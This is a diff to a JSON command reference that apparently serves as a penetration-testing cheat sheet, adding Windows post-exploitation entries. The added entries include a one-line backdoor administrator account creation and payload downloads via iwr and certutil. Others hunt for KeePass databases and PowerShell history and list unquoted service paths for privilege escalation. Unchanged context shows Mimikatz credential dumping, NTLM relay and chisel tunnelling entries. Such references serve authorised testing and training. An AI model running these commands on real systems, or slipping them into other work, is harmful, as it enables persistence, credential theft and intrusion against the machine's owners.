@@ -68,9 +68,61 @@
     {
       "id": 16,
       "Name": "Mimikatz"
+    },
+    {
+      "id": 17,
+      "Name": "Misc Windows"
     }
   ],
   "commands": [
+    {
+      "Name": "net",
+      "Category": 17,
+      "Description": "Create a windows backdoor admin account",
+      "Command": "net user mrtheplague 'password1234!!' /add; net localgroup Administrators mrtheplague /add"
+    },
+    {
+      "Name": "schtasks",
+      "Category": 17,
+      "Description": "List all scheduled tasks that have executables under C:\\Users*",
+      "Command": "schtasks /query /fo CSV /v | ConvertFrom-Csv | Where-Object { $_.\"Task To Run\" -Like \"C:\\Users*\" -and $_.\"TaskName\" -ne \"\" -and $_.\"TaskName\" -ne \"TaskName\" }"
+    },
+    {
+      "Name": "wmic",
+      "Category": 17,
+      "Description": "List all services that have unquoted paths",
+      "Command": "wmic service get name,pathname |  Select-string -NotMatch \"Windows\" | Select-string -NotMatch -Pattern '\"' | Where-Object {  -not [String]::IsNullOrEmpty($_) }'"
+    },
+    {
+      "Name": "iwr",
+      "Category": 17,
+      "Description": "Download file to windows",
+      "Command": "iwr -uri http://192.168.48.3/file.ps1 -Outfile file"
+    },
+    {
+      "Name": "certutil",
+      "Category": 17,
+      "Description": "Download file to windows",
+      "Command": "certutil -UrlCache -f http://host.com/file .\\file"
+    },
+    {
+      "Name": "netstat",
+      "Category": 17,
+      "Description": "List all active network connections and listening ports",
+      "Command": "netstat -ano"
+    },
+    {
+      "Name": "route",
+      "Category": 17,
+      "Description": "Display the routing table, which contains all routes of the system",
+      "Command": "route print"
+    },
+    {
+      "Name": "systeminfo",
+      "Category": 17,
+      "Description": "Display windows system information",
+      "Command": "systeminfo"
+    },
     {
       "Name": "impacket-ntlmrelayx",
       "Category": 9,
@@ -104,7 +156,7 @@
     {
       "Name": "mimikatz",
       "Category": 16,
-      "Description": "Attempts to extract plaintext passwords and paassword hashes from all available sources",
+      "Description": "Attempts to extract plaintext passwords and password hashes from all available sources",
       "Command": "sekurlsa::logonpasswords"
     },    
     {
@@ -118,6 +170,96 @@
       "Category": 15,
       "Description": "Get Computer Info on Windows",
       "Command": "Get-ComputerInfo"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Get Group Info on Windows",
+      "Command": "Get-LocalGroup"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Get Group Member Info on Windows",
+      "Command": "Get-LocalGroupMember 'Group Name'"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "List all installed 32bit applications",
+      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Wow6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "List all installed 64bit applications",
+      "Command": "Get-ItemProperty 'HKLM:\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall\\*' | select displayname"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "List all running processes executable paths",
+      "Command": "(Get-Process).Path"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "List all running processes",
+      "Command": "Get-Process"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Show powershell history for current user",
+      "Command": "Get-History"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Show powershell history file path",
+      "Command": "(Get-PSReadlineOption).HistorySavePath"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Recursive powershell search by wildcard for extension kdbx",
+      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Search windows events by event ID",
+      "Command": "Get-WinEvent -FilterHashtable @{LogName = '*'; Id = 4104} | Select-Object -ExpandProperty Message"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Grep powershell command output",
+      "Command": "Select-String -Pattern 'search term'"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Recursive powershell search by wildcard for common extensions",
+      "Command": "Get-ChildItem -Path c:\\ -Include *.txt,*.pdf,*.xls,*.doc,*.docx -File -Recurse -ErrorAction SilentlyContinue"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Search for all services, running and stopped, that don't have system32 in the path",
+      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.PathName -notlike \"*system32*\"}"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 15,
+      "Description": "Search for running services that don't have system32 in the path",
+      "Command": "Get-CimInstance -ClassName win32_service | Select Name,State,PathName | Where-Object {$_.State -like 'Running'} | Where-Object {$_.PathName -notlike \"*system32*\"}"
+    },
+    {
+      "Name": "Powershell",
+      "Category": 7,
+      "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
+      "Command": "Test-NetConnection -Port 25 192.168.50.8"
     },
     {
       "Name": "Start System Service",
@@ -202,12 +344,6 @@
       "Category": 8,
       "Description": "Enables the Telnet Client feature on a Windows system using DISM",
       "Command": "dism /online /Enable-Feature /FeatureName:TelnetClient"
-    },
-    {
-      "Name": "Test-NetConnection SMTP",
-      "Category": 7,
-      "Description": "Tests connectivity to port 25 (SMTP) on 192.168.50.8 using PowerShell",
-      "Command": "Test-NetConnection -Port 25 192.168.50.8"
     },
     {
       "Name": "Netcat SMTP Connect",
@@ -754,13 +890,6 @@
       "Category": 9,
       "Description": "Port forwarding with chisel",
       "Command": "chisel server --port $PORT --proxy http://example.com"
-    },
-    {
-      "Name": "powershell",
-      "Category": 15,
-      "Description": "Recursive powershell search by wildcard extension",
-      "Command": "Get-ChildItem -Path c:\\ -Include *.kdbx -File -Recurse -ErrorAction SilentlyContinue"
     }
-
   ]
 }
